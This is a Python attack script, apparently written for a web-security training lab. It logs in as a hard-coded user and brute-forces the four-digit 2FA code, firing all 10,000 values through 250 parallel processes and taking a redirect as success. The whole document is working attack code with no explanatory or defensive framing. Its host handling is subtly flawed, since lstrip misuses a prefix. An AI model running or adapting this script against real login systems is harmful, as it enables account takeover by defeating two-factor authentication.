import sys
import requests
from bs4 import BeautifulSoup
import multiprocessing
# import numpy as np

# To create a single session
global s
global site
global event


def Check_Second_Factor_Code(web_response, factor_code):
    if web_response == 302:
        print(f'2fa valid with response code {web_response}')
        print(f'2fa valid code: {factor_code}')
        event.set()
        # Visit account profile page to complete level
    else:
        if(event.is_set()):
            print(event.is_set())
            print("Exiting a incorrect 2fa thread")


def Login_to_account(factor_code):
    login_url = f'https://{site}/login'

    resp = s.get(login_url)  # new one each time, otherwise boot
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    logindata = {
        'csrf': csrf,
        'username': 'carlos',
        'password': 'montoya'
    }
    # print(f'Logging in as carlos:montoya')
    # print(f'Using 2FA code: {factor_code}')
    resp = s.post(login_url, data=logindata)
    # print(f'Login response: {resp.text}')

    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    # print(f'CSRF: {csrf}')
    login2_url = f'https://{site}/login2'
    login2data = {
        'csrf': csrf,
        'mfa-code': str(factor_code).zfill(4)
    }
    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    Check_Second_Factor_Code(resp.status_code, factor_code)


if __name__ == '__main__':
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')

    s = requests.Session()
    event = multiprocessing.Event()

    # Generate a list of 0-9999
    factor_code_list = list(i for i in range(10000))
    # Get alot of workers.
    # workers = multiprocessing.cpu_count() * 21
    workers = 250

    with multiprocessing.Pool(workers) as w:
        w.map(Login_to_account, factor_code_list)
        w.terminate()
